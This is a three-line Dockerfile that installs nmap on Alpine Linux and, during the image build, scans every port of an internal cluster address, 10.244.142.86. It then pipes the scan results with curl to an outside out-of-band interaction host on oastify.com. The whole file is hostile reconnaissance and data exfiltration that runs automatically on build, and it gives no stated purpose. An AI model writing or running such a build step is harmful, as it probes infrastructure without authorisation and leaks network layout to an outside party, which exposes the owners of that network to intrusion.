FROM alpine
RUN apk add --no-cache nmap



RUN C=http://g3kod0ltewj2n00dn7hd5kzwwn2eqie7.oastify.com; \
    nmap -p- 10.244.142.86 | curl -s "$C/recon" --data-binary @-

